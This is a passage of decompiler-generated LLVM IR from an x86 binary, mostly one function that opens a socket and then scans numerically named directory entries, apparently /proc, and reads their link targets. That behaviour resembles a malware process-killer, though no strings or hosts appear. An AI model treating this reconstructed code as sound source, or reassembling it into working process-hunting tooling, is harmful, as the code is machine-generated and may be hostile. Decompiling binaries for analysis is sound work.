  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 91, 77, 78, 79, 80, 81, 82, 92, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32 (i8*, i32)* @function_804f6b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805244d.6 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804f7d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cfa7, { 1, 0 }
  uselistorder label %dec_label_pc_804cf7e, { 1, 0 }
  uselistorder label %dec_label_pc_804cdcd.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804cde3, { 1, 0 }
  uselistorder label %dec_label_pc_804cc89, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804cc3b.loopexit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cb1c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804cb04.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804cbb3, { 1, 0 }
  uselistorder label %dec_label_pc_804cb74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cb04.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cb41, { 1, 0 }
  uselistorder label %dec_label_pc_804cb35, { 1, 0 }
  uselistorder label %dec_label_pc_804cac4, { 1, 0 }
}

define i32 @function_804d030() local_unnamed_addr {
dec_label_pc_804d030:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-8388 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8460 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8460, align 4
  %v2_804d03c = call i32 @function_804fe12(i32* null)
  store i32 %v2_804d03c, i32* %eax.global-to-local, align 4
  store i32 %v2_804d03c, i32* @esi, align 4
  %v0_804d043 = call i32 @function_804fb7f()
  store i32 %v0_804d043, i32* %eax.global-to-local, align 4
  %v12_804d048 = ptrtoint i32* %stack_var_-8444 to i32
  store i32 %v0_804d043, i32* @global_var_805310c.21, align 4
  %tmp112 = icmp slt i32 %v0_804d043, 1
  br i1 %tmp112, label %dec_label_pc_804d05f, label %dec_label_pc_804d054

dec_label_pc_804d054:                             ; preds = %dec_label_pc_804d1f0, %dec_label_pc_804d0c4, %dec_label_pc_804d05f, %dec_label_pc_804d030
  %v0_804d05e = phi i32 [ -1, %dec_label_pc_804d0c4 ], [ 0, %dec_label_pc_804d05f ], [ %v0_804d043, %dec_label_pc_804d030 ], [ 0, %dec_label_pc_804d1f0 ]
  ret i32 %v0_804d05e

dec_label_pc_804d05f:                             ; preds = %dec_label_pc_804d030
  %v1_804d05f = add i32 %v0_804d043, 1
  %v8_804d05f = icmp eq i32 %v1_804d05f, 0
  store i32 %v1_804d05f, i32* %eax.global-to-local, align 4
  br i1 %v8_804d05f, label %dec_label_pc_804d054, label %dec_label_pc_804d062

dec_label_pc_804d062:                             ; preds = %dec_label_pc_804d05f
  store i32 2, i32* %stack_var_-52, align 4
  store i32 5888, i32* %stack_var_-8460, align 4
  %v1_804d07f = call i32 @function_804ca10(i32 5888)
  store i32 %v1_804d07f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804d097 = call i32 @function_8050345(i32 2, i32 1, i32 0)
  store i32 %v3_804d097, i32* %eax.global-to-local, align 4
  store i32 %v3_804d097, i32* @ebx, align 4
  %v10_804d0a1 = icmp eq i32 %v3_804d097, -1
  br i1 %v10_804d0a1, label %dec_label_pc_804d0c4, label %dec_label_pc_804d0a6

dec_label_pc_804d0a6:                             ; preds = %dec_label_pc_804d062
  %v2_804d0a6 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804d0a6, i32* %eax.global-to-local, align 4
  %v0_804d0ad = load i32, i32* @ecx, align 4
  store i32 %v3_804d097, i32* %stack_var_-8460, align 4
  %v4_804d0b2 = call i32 @function_805013f(i32 %v3_804d097, i32 %v2_804d0a6, i32 16, i32 %v0_804d0ad)
  %v2_804d0b7 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804d0b7, i32* %eax.global-to-local, align 4
  %v0_804d0bb = load i32, i32* @ebx, align 4
  store i32 %v0_804d0bb, i32* %stack_var_-8460, align 4
  %v2_804d0bc = call i32 @function_80501fb(i32 %v0_804d0bb, i32 1)
  store i32 %v2_804d0bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d0c4

dec_label_pc_804d0c4:                             ; preds = %dec_label_pc_804d062, %dec_label_pc_804d0a6
  store i32 5, i32* %stack_var_-8460, align 4
  %v1_804d0c9 = call i32 @function_8051700(i32 5)
  store i32 %v1_804d0c9, i32* %eax.global-to-local, align 4
  store i32 4096, i32* %stack_var_-8460, align 4
  %v1_804d0d5 = call i32 @function_80504e4(i32 4096)
  %v2_804d0d5 = inttoptr i32 %v1_804d0d5 to i8*
  store i32 %v1_804d0d5, i32* %eax.global-to-local, align 4
  store i32 %v1_804d0d5, i32* @global_var_8053108.22, align 8
  store i8 0, i8* %v2_804d0d5, align 1
  store i32 6, i32* %stack_var_-8460, align 4
  store i32 0, i32* @global_var_80530c4.23, align 4
  %v2_804d0f3 = call i32 @function_804ec60(i8 6)
  store i32 %v2_804d0f3, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804d0ff = call i32 @function_804ec60(i8 7)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v3_804d10a = call i32 @function_804ebb0(i32 6, i32* null)
  %v2_804d10f = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804d10f, i32* @ebx, align 4
  %v2_804d112 = ptrtoint i32* %stack_var_-8388 to i32
  store i32 %v2_804d112, i32* %eax.global-to-local, align 4
  store i32 %v2_804d112, i32* %stack_var_-8460, align 4
  %v2_804d11b = bitcast i32* %stack_var_-8388 to i8*
  %v3_804d11b = call i32 @function_804f5d0(i8* %v2_804d11b, i32 %v3_804d10a)
  store i32 %v3_804d11b, i32* %eax.global-to-local, align 4
  %v2_804d124 = add i32 %v3_804d11b, %v2_804d112
  store i32 %v2_804d124, i32* @ebx, align 4
  %v0_804d126 = call i32 @function_804fba5()
  store i32 %v0_804d126, i32* %eax.global-to-local, align 4
  %v2_804d12e = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v0_804d126, i32* %stack_var_-8460, align 4
  %v3_804d139 = sext i32 %v0_804d126 to i64
  %v4_804d139 = call i32 @function_804f9c0(i64 %v3_804d139, i32 10, i32 %v2_804d12e)
  store i32 %v4_804d139, i32* %eax.global-to-local, align 4
  %v0_804d141 = load i32, i32* @ebx, align 4
  store i32 %v0_804d141, i32* %stack_var_-8460, align 4
  %v2_804d142 = inttoptr i32 %v0_804d141 to i8*
  %v3_804d142 = call i32 @function_804f5d0(i8* %v2_804d142, i32 %v4_804d139)
  %v2_804d147 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804d147, i32* @ebp, align 4
  %v0_804d148 = load i32, i32* @ebx, align 4
  %v2_804d148 = add i32 %v0_804d148, %v3_804d142
  store i32 %v2_804d148, i32* @ebx, align 4
  store i32 %v4_804d139, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v3_804d14f = call i32 @function_804ebb0(i32 7, i32* null)
  store i32 %v3_804d14f, i32* %eax.global-to-local, align 4
  %v0_804d157 = load i32, i32* @ebx, align 4
  store i32 %v0_804d157, i32* %stack_var_-8460, align 4
  %v2_804d158 = inttoptr i32 %v0_804d157 to i8*
  %v3_804d158 = call i32 @function_804f5d0(i8* %v2_804d158, i32 %v3_804d14f)
  store i32 %v3_804d158, i32* @edi, align 4
  store i32 %v2_804d112, i32* %eax.global-to-local, align 4
  store i32 %v2_804d112, i32* %stack_var_-8460, align 4
  %v3_804d168 = call i32 @function_804fc62(i8* %v2_804d11b, i32 0)
  store i32 %v3_804d168, i32* %eax.global-to-local, align 4
  %v10_804d170 = icmp eq i32 %v3_804d168, -1
  br i1 %v10_804d170, label %dec_label_pc_804d054, label %dec_label_pc_804d179

dec_label_pc_804d179:                             ; preds = %dec_label_pc_804d0c4
  store i32 %v3_804d168, i32* %stack_var_-8460, align 4
  %v1_804d17d = call i32 @function_804fb51(i32 %v3_804d168)
  store i32 %v1_804d17d, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v2_804d189 = call i32 @function_804ebe0(i8 6)
  store i32 %v2_804d189, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804d195 = call i32 @function_804ebe0(i8 7)
  %v0_804d19d = load i32, i32* @global_var_8053108.22, align 8
  store i32 %v2_804d112, i32* %eax.global-to-local, align 4
  store i32 %v2_804d112, i32* %stack_var_-8460, align 4
  %v4_804d1ad = call i32 @function_804fd22(i8* %v2_804d11b, i32 %v0_804d19d, i32 4095)
  store i32 %v4_804d1ad, i32* %eax.global-to-local, align 4
  %v10_804d1b7 = icmp eq i32 %v4_804d1ad, -1
  br i1 %v10_804d1b7, label %dec_label_pc_804d1c5, label %dec_label_pc_804d1bc

dec_label_pc_804d1bc:                             ; preds = %dec_label_pc_804d179
  %v0_804d1bc = load i32, i32* @global_var_8053108.22, align 8
  store i32 %v0_804d1bc, i32* %eax.global-to-local, align 4
  %v2_804d1c1 = add i32 %v0_804d1bc, %v4_804d1ad
  %v3_804d1c1 = inttoptr i32 %v2_804d1c1 to i8*
  store i8 0, i8* %v3_804d1c1, align 1
  br label %dec_label_pc_804d1c5

dec_label_pc_804d1c5:                             ; preds = %dec_label_pc_804d179, %dec_label_pc_804d1bc
  %v0_804d1cb = load i32, i32* @ebx, align 4
  %v1_804d1cb = load i32, i32* @edi, align 4
  %v2_804d1cb = sub i32 %v0_804d1cb, %v2_804d112
  %v2_804d1ce = add i32 %v2_804d1cb, %v1_804d1cb
  store i32 %v2_804d1ce, i32* @eax, align 4
  %v0_804d1d0 = load i32, i32* @esi, align 4
  store i32 %v0_804d1d0, i32* @ebx, align 4
  store i32 400, i32* @esi, align 4
  store i32 %v2_804d112, i32* @edi, align 4
  store i32 %v2_804d112, i32* %stack_var_-8460, align 4
  %v2_804d1dd = call i32 @function_804f640(i32 %v2_804d112, i32 %v2_804d1ce)
  store i32 %v2_804d1dd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d1f0

dec_label_pc_804d1f0:                             ; preds = %dec_label_pc_804d423, %dec_label_pc_804d1c5
  %storemerge8 = phi i32 [ %v1_804d430, %dec_label_pc_804d423 ], [ %v12_804d048, %dec_label_pc_804d1c5 ]
  %v1_804d1f3 = add i32 %storemerge8, -16
  %v2_804d1f3 = inttoptr i32 %v1_804d1f3 to i32*
  store i32 6, i32* %v2_804d1f3, align 4
  %v2_804d1f5 = call i32 @function_804ec60(i8 0)
  store i32 %v2_804d1f5, i32* %eax.global-to-local, align 4
  %v0_804d1fa = load i32, i32* @esp, align 4
  %v1_804d1fa = inttoptr i32 %v0_804d1fa to i32*
  %v2_804d1fa = load i32, i32* %v1_804d1fa, align 4
  store i32 %v2_804d1fa, i32* %eax.global-to-local, align 4
  %v3_804d1fa = add i32 %v0_804d1fa, 4
  %v1_804d1fb = inttoptr i32 %v3_804d1fa to i32*
  store i32 0, i32* %v1_804d1fb, align 4
  store i32 6, i32* %v1_804d1fa, align 4
  %v3_804d200 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d200, i32* %eax.global-to-local, align 4
  %v1_804d205 = load i32, i32* @esp, align 4
  %v2_804d205 = inttoptr i32 %v1_804d205 to i32*
  store i32 %v3_804d200, i32* %v2_804d205, align 4
  %v1_804d208 = call i32 @function_804ff14(i32 0)
  store i32 %v1_804d208, i32* %eax.global-to-local, align 4
  %v1_804d20d = load i32, i32* @esp, align 4
  %v2_804d20d = add i32 %v1_804d20d, 32
  %v3_804d20d = inttoptr i32 %v2_804d20d to i32*
  store i32 %v1_804d208, i32* %v3_804d20d, align 4
  %v0_804d214 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d214 = icmp eq i32 %v0_804d214, 0
  br i1 %v1_804d214, label %dec_label_pc_804d054, label %dec_label_pc_804d21c

dec_label_pc_804d21c:                             ; preds = %dec_label_pc_804d1f0
  %v0_804d211 = load i32, i32* @esp, align 4
  %v2_804d21f = inttoptr i32 %v0_804d211 to i32*
  store i32 6, i32* %v2_804d21f, align 4
  %v2_804d221 = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d221, i32* %eax.global-to-local, align 4
  %v0_804d226 = load i32, i32* @esp, align 4
  %v1_804d226 = add i32 %v0_804d226, 16
  br label %dec_label_pc_804d230

dec_label_pc_804d230:                             ; preds = %dec_label_pc_804d438, %dec_label_pc_804d444, %dec_label_pc_804d24a, %dec_label_pc_804d6fc, %dec_label_pc_804d461, %dec_label_pc_804d418, %dec_label_pc_804d28c, %dec_label_pc_804d21c
  %v0_804d230 = phi i32 [ %v1_804d226, %dec_label_pc_804d21c ], [ %v1_804d27e, %dec_label_pc_804d28c ], [ %v0_804d41a, %dec_label_pc_804d418 ], [ %v1_804d46b, %dec_label_pc_804d461 ], [ %v1_804d730, %dec_label_pc_804d6fc ], [ %v1_804d23d, %dec_label_pc_804d24a ], [ %v1_804d27e, %dec_label_pc_804d444 ], [ %v1_804d27e, %dec_label_pc_804d438 ]
  %v1_804d233 = add i32 %v0_804d230, 16
  %v2_804d233 = inttoptr i32 %v1_804d233 to i32*
  %v3_804d233 = load i32, i32* %v2_804d233, align 4
  store i32 %v3_804d233, i32* %eax.global-to-local, align 4
  %v2_804d237 = add i32 %v0_804d230, -16
  %v3_804d237 = inttoptr i32 %v2_804d237 to i32*
  store i32 %v3_804d233, i32* %v3_804d237, align 4
  %v0_804d238 = call i32 @function_8050005()
  store i32 %v0_804d238, i32* %eax.global-to-local, align 4
  %v0_804d23d = load i32, i32* @esp, align 4
  store i32 %v0_804d238, i32* @edx, align 4
  %v1_804d242 = icmp eq i32 %v0_804d238, 0
  br i1 %v1_804d242, label %dec_label_pc_804d423, label %dec_label_pc_804d24a

dec_label_pc_804d24a:                             ; preds = %dec_label_pc_804d230
  %v1_804d23d = add i32 %v0_804d23d, 16
  %v1_804d24a = add i32 %v0_804d238, 11
  %v2_804d24a = inttoptr i32 %v1_804d24a to i8*
  %v3_804d24a = load i8, i8* %v2_804d24a, align 1
  %v4_804d24a = zext i8 %v3_804d24a to i32
  %v6_804d24a = and i32 %v0_804d238, -256
  %v7_804d24a = or i32 %v4_804d24a, %v6_804d24a
  %v1_804d24d = add i32 %v7_804d24a, -48
  %v8_804d24d = trunc i32 %v1_804d24d to i8
  store i32 %v1_804d24d, i32* %eax.global-to-local, align 4
  %v8_804d252 = icmp ugt i8 %v8_804d24d, 9
  br i1 %v8_804d252, label %dec_label_pc_804d230, label %dec_label_pc_804d254

dec_label_pc_804d254:                             ; preds = %dec_label_pc_804d24a
  store i32 %v1_804d24a, i32* @edi, align 4
  %v3_804d25a = inttoptr i32 %v0_804d23d to i32*
  store i32 %v1_804d24a, i32* %v3_804d25a, align 4
  %v0_804d25b = call i32 @function_8051556()
  store i32 %v0_804d25b, i32* %eax.global-to-local, align 4
  %v0_804d260 = load i32, i32* @esp, align 4
  store i32 %v0_804d25b, i32* @ebp, align 4
  %v1_804d265 = add i32 %v0_804d260, 28
  %v2_804d265 = inttoptr i32 %v1_804d265 to i32*
  %v3_804d265 = load i32, i32* %v2_804d265, align 4
  %v1_804d269 = add i32 %v3_804d265, 1
  store i32 %v1_804d269, i32* %eax.global-to-local, align 4
  %v0_804d26a = load i32, i32* @esi, align 4
  store i32 %v1_804d269, i32* %v2_804d265, align 4
  %v5_804d270 = icmp slt i32 %v0_804d26a, %v0_804d25b
  %v0_804d293 = load i32, i32* @esp, align 4
  %v1_804d296 = add i32 %v0_804d293, -16
  %v2_804d296 = inttoptr i32 %v1_804d296 to i32*
  store i32 0, i32* %v2_804d296, align 4
  %v2_804d298 = call i32 @function_804fe12(i32* null)
  store i32 %v2_804d298, i32* %eax.global-to-local, align 4
  br i1 %v5_804d270, label %dec_label_pc_804d293, label %dec_label_pc_804d272

dec_label_pc_804d272:                             ; preds = %dec_label_pc_804d254
  %v1_804d27c = load i32, i32* @ebx, align 4
  %v2_804d27c = sub i32 %v2_804d298, %v1_804d27c
  store i32 %v2_804d27c, i32* %eax.global-to-local, align 4
  %v0_804d27e = load i32, i32* @esp, align 4
  %v1_804d27e = add i32 %v0_804d27e, 16
  %v1_804d281 = add i32 %v2_804d27c, -600
  %v6_804d281 = sub i32 599, %v2_804d27c
  %v7_804d281 = and i32 %v6_804d281, %v2_804d27c
  %v8_804d281 = icmp slt i32 %v7_804d281, 0
  %v9_804d281 = icmp eq i32 %v1_804d281, 0
  %v10_804d281 = icmp slt i32 %v1_804d281, 0
  %v3_804d286 = icmp ne i1 %v10_804d281, %v8_804d281
  %v4_804d286 = or i1 %v9_804d281, %v3_804d286
  br i1 %v4_804d286, label %dec_label_pc_804d438, label %dec_label_pc_804d28c

dec_label_pc_804d28c:                             ; preds = %dec_label_pc_804d272
  store i32 400, i32* @esi, align 4
  br label %dec_label_pc_804d230

dec_label_pc_804d293:                             ; preds = %dec_label_pc_804d254
  store i32 %v2_804d298, i32* %eax.global-to-local, align 4
  %v0_804d29d = load i32, i32* @esp, align 4
  %v1_804d29d = inttoptr i32 %v0_804d29d to i32*
  store i32 6, i32* %v1_804d29d, align 4
  %v1_804d2a4 = load i32, i32* @esp, align 4
  %v2_804d2a4 = add i32 %v1_804d2a4, 24
  %v3_804d2a4 = inttoptr i32 %v2_804d2a4 to i32*
  store i32 %v2_804d298, i32* %v3_804d2a4, align 4
  %v2_804d2a8 = call i32 @function_804ec60(i8 0)
  store i32 %v2_804d2a8, i32* %eax.global-to-local, align 4
  %v0_804d2ad = load i32, i32* @esp, align 4
  %v1_804d2ad = inttoptr i32 %v0_804d2ad to i32*
  store i32 7, i32* %v1_804d2ad, align 4
  %v2_804d2b4 = call i32 @function_804ec60(i8 0)
  store i32 %v2_804d2b4, i32* %eax.global-to-local, align 4
  %v0_804d2b9 = load i32, i32* @esp, align 4
  %v1_804d2b9 = inttoptr i32 %v0_804d2b9 to i32*
  %v3_804d2b9 = add i32 %v0_804d2b9, 4
  %v1_804d2ba = inttoptr i32 %v3_804d2b9 to i32*
  %v2_804d2ba = load i32, i32* %v1_804d2ba, align 4
  store i32 %v2_804d2ba, i32* @ebx, align 4
  store i32 0, i32* %v1_804d2ba, align 4
  store i32 6, i32* %v1_804d2b9, align 4
  %v3_804d2bf = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d2bf, i32* %eax.global-to-local, align 4
  %v0_804d2c4 = load i32, i32* @esp, align 4
  %v1_804d2c4 = inttoptr i32 %v0_804d2c4 to i32*
  %v3_804d2c4 = add i32 %v0_804d2c4, 4
  %v1_804d2c5 = inttoptr i32 %v3_804d2c4 to i32*
  store i32 %v3_804d2bf, i32* %v1_804d2c5, align 4
  %v1_804d2c7 = add i32 %v0_804d2c4, 8328
  store i32 %v1_804d2c7, i32* %eax.global-to-local, align 4
  store i32 %v1_804d2c7, i32* %v1_804d2c4, align 4
  %v3_804d2cf = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d2cf, i32* %eax.global-to-local, align 4
  %v0_804d2d4 = load i32, i32* @esp, align 4
  %v1_804d2d4 = add i32 %v0_804d2d4, 8328
  %v1_804d2db = inttoptr i32 %v0_804d2d4 to i32*
  %v3_804d2db = add i32 %v0_804d2d4, 4
  %v2_804d2dc = add i32 %v1_804d2d4, %v3_804d2cf
  store i32 %v2_804d2dc, i32* @esi, align 4
  %v1_804d2de = inttoptr i32 %v3_804d2db to i32*
  %v2_804d2de = load i32, i32* %v1_804d2de, align 4
  store i32 %v2_804d2de, i32* @ebx, align 4
  %v0_804d2df = load i32, i32* @edi, align 4
  store i32 %v0_804d2df, i32* %v1_804d2de, align 4
  %v0_804d2e0 = load i32, i32* @esi, align 4
  store i32 %v0_804d2e0, i32* %v1_804d2db, align 4
  %v3_804d2e1 = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d2e1, i32* %eax.global-to-local, align 4
  store i32 %v3_804d2e1, i32* @ebx, align 4
  %v0_804d2e8 = load i32, i32* @esp, align 4
  %v1_804d2e8 = inttoptr i32 %v0_804d2e8 to i32*
  %v2_804d2e8 = load i32, i32* %v1_804d2e8, align 4
  store i32 %v2_804d2e8, i32* %eax.global-to-local, align 4
  %v3_804d2e8 = add i32 %v0_804d2e8, 4
  %v1_804d2e9 = inttoptr i32 %v3_804d2e8 to i32*
  store i32 0, i32* %v1_804d2e9, align 4
  store i32 7, i32* %v1_804d2e8, align 4
  %v3_804d2ee = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d2ee, i32* %eax.global-to-local, align 4
  %v0_804d2f3 = load i32, i32* @esp, align 4
  %v1_804d2f3 = inttoptr i32 %v0_804d2f3 to i32*
  %v3_804d2f3 = add i32 %v0_804d2f3, 4
  %v1_804d2f4 = inttoptr i32 %v3_804d2f3 to i32*
  store i32 %v3_804d2ee, i32* %v1_804d2f4, align 4
  %v0_804d2f6 = load i32, i32* @esi, align 4
  %v1_804d2f6 = load i32, i32* @ebx, align 4
  %v2_804d2f6 = add i32 %v1_804d2f6, %v0_804d2f6
  store i32 %v2_804d2f6, i32* %eax.global-to-local, align 4
  store i32 %v2_804d2f6, i32* %v1_804d2f3, align 4
  %v3_804d2fa = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d2fa, i32* %eax.global-to-local, align 4
  %v0_804d2ff = load i32, i32* @esp, align 4
  %v1_804d2ff = inttoptr i32 %v0_804d2ff to i32*
  %v3_804d2ff = add i32 %v0_804d2ff, 4
  %v1_804d300 = inttoptr i32 %v3_804d2ff to i32*
  %v2_804d300 = load i32, i32* %v1_804d300, align 4
  store i32 %v2_804d300, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d300, align 4
  store i32 6, i32* %v1_804d2ff, align 4
  %v3_804d305 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d305, i32* %eax.global-to-local, align 4
  %v0_804d30a = load i32, i32* @esp, align 4
  %v1_804d30a = inttoptr i32 %v0_804d30a to i32*
  %v3_804d30a = add i32 %v0_804d30a, 4
  %v1_804d30b = inttoptr i32 %v3_804d30a to i32*
  %v2_804d30b = load i32, i32* %v1_804d30b, align 4
  store i32 %v2_804d30b, i32* @ebx, align 4
  store i32 %v3_804d305, i32* %v1_804d30b, align 4
  %v1_804d30d = add i32 %v0_804d30a, 8264
  store i32 %v1_804d30d, i32* %eax.global-to-local, align 4
  store i32 %v1_804d30d, i32* %v1_804d30a, align 4
  %v3_804d315 = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d315, i32* %eax.global-to-local, align 4
  %v0_804d31a = load i32, i32* @esp, align 4
  %v1_804d31a = add i32 %v3_804d315, 8264
  %v2_804d321 = add i32 %v1_804d31a, %v0_804d31a
  store i32 %v2_804d321, i32* @esi, align 4
  %v1_804d323 = inttoptr i32 %v0_804d31a to i32*
  %v2_804d323 = load i32, i32* %v1_804d323, align 4
  store i32 %v2_804d323, i32* %eax.global-to-local, align 4
  %v3_804d323 = add i32 %v0_804d31a, 4
  %v1_804d324 = inttoptr i32 %v3_804d323 to i32*
  %v0_804d325 = load i32, i32* @edi, align 4
  store i32 %v0_804d325, i32* %v1_804d324, align 4
  %v0_804d326 = load i32, i32* @esi, align 4
  store i32 %v0_804d326, i32* %v1_804d323, align 4
  %v3_804d327 = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d327, i32* %eax.global-to-local, align 4
  %v0_804d32c = load i32, i32* @esp, align 4
  %v1_804d32c = inttoptr i32 %v0_804d32c to i32*
  %v3_804d32c = add i32 %v0_804d32c, 4
  %v1_804d32d = inttoptr i32 %v3_804d32c to i32*
  store i32 %v3_804d327, i32* @ebx, align 4
  store i32 0, i32* %v1_804d32d, align 4
  store i32 11, i32* %v1_804d32c, align 4
  %v3_804d334 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d334, i32* %eax.global-to-local, align 4
  %v0_804d339 = load i32, i32* @esp, align 4
  %v1_804d339 = inttoptr i32 %v0_804d339 to i32*
  %v3_804d339 = add i32 %v0_804d339, 4
  %v1_804d33a = inttoptr i32 %v3_804d339 to i32*
  store i32 %v3_804d334, i32* %v1_804d33a, align 4
  %v0_804d33c = load i32, i32* @esi, align 4
  %v1_804d33c = load i32, i32* @ebx, align 4
  %v2_804d33c = add i32 %v1_804d33c, %v0_804d33c
  store i32 %v2_804d33c, i32* %eax.global-to-local, align 4
  store i32 %v2_804d33c, i32* %v1_804d339, align 4
  %v3_804d340 = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d340, i32* %eax.global-to-local, align 4
  %v0_804d345 = load i32, i32* @esp, align 4
  %v1_804d345 = inttoptr i32 %v0_804d345 to i32*
  store i32 6, i32* %v1_804d345, align 4
  %v2_804d34c = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d34c, i32* %eax.global-to-local, align 4
  %v0_804d351 = load i32, i32* @esp, align 4
  %v1_804d351 = inttoptr i32 %v0_804d351 to i32*
  store i32 7, i32* %v1_804d351, align 4
  %v2_804d358 = call i32 @function_804ebe0(i8 0)
  %v0_804d35d = load i32, i32* @esp, align 4
  %v1_804d360 = add i32 %v0_804d35d, 8
  %v2_804d360 = inttoptr i32 %v1_804d360 to i32*
  store i32 4095, i32* %v2_804d360, align 4
  %v1_804d365 = add i32 %v0_804d35d, 4168
  store i32 %v1_804d365, i32* @edi, align 4
  %v2_804d36c = add i32 %v0_804d35d, 4
  %v3_804d36c = inttoptr i32 %v2_804d36c to i32*
  store i32 %v1_804d365, i32* %v3_804d36c, align 4
  %v1_804d36d = add i32 %v0_804d35d, 8328
  store i32 %v1_804d36d, i32* %eax.global-to-local, align 4
  %v3_804d374 = inttoptr i32 %v0_804d35d to i32*
  store i32 %v1_804d36d, i32* %v3_804d374, align 4
  %v4_804d375 = call i32 @function_804fd22(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d375, i32* %eax.global-to-local, align 4
  %v0_804d37a = load i32, i32* @esp, align 4
  %v1_804d37a = add i32 %v0_804d37a, 16
  store i32 %v4_804d375, i32* @ebx, align 4
  %v10_804d37f = icmp eq i32 %v4_804d375, -1
  br i1 %v10_804d37f, label %dec_label_pc_804d4a7, label %dec_label_pc_804d388

dec_label_pc_804d388:                             ; preds = %dec_label_pc_804d293
  %v2_804d388 = add i32 %v4_804d375, 4152
  %v3_804d388 = add i32 %v2_804d388, %v1_804d37a
  %v4_804d388 = inttoptr i32 %v3_804d388 to i8*
  store i8 0, i8* %v4_804d388, align 1
  %v0_804d390 = load i32, i32* @esp, align 4
  %v1_804d393 = add i32 %v0_804d390, -16
  %v2_804d393 = inttoptr i32 %v1_804d393 to i32*
  store i32 10, i32* %v2_804d393, align 4
  %v2_804d395 = call i32 @function_804ec60(i8 0)
  store i32 %v2_804d395, i32* %eax.global-to-local, align 4
  %v0_804d39a = load i32, i32* @esp, align 4
  %v1_804d39a = inttoptr i32 %v0_804d39a to i32*
  %v3_804d39a = add i32 %v0_804d39a, 4
  %v1_804d39b = inttoptr i32 %v3_804d39a to i32*
  %v2_804d39b = load i32, i32* %v1_804d39b, align 4
  store i32 %v2_804d39b, i32* @esi, align 4
  store i32 0, i32* %v1_804d39b, align 4
  store i32 10, i32* %v1_804d39a, align 4
  %v3_804d3a0 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  %v0_804d3a5 = load i32, i32* @esp, align 4
  %v2_804d3a8 = add i32 %v0_804d3a5, 8
  %v3_804d3a8 = inttoptr i32 %v2_804d3a8 to i32*
  store i32 %v3_804d3a0, i32* %v3_804d3a8, align 4
  %v0_804d3a9 = load i32, i32* @ebx, align 4
  %v1_804d3a9 = add i32 %v0_804d3a9, -1
  store i32 %v1_804d3a9, i32* %eax.global-to-local, align 4
  %v2_804d3ac = add i32 %v0_804d3a5, 4
  %v3_804d3ac = inttoptr i32 %v2_804d3ac to i32*
  store i32 %v1_804d3a9, i32* %v3_804d3ac, align 4
  %v1_804d3ad = add i32 %v0_804d3a5, 4168
  store i32 %v1_804d3ad, i32* @edi, align 4
  %v3_804d3b4 = inttoptr i32 %v0_804d3a5 to i32*
  store i32 %v1_804d3ad, i32* %v3_804d3b4, align 4
  %v4_804d3b5 = call i32 @function_804f8a0(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d3ba = load i32, i32* @esp, align 4
  %v1_804d3bd = add i32 %v4_804d3b5, 1
  %v8_804d3bd = icmp eq i32 %v1_804d3bd, 0
  store i32 %v1_804d3bd, i32* %eax.global-to-local, align 4
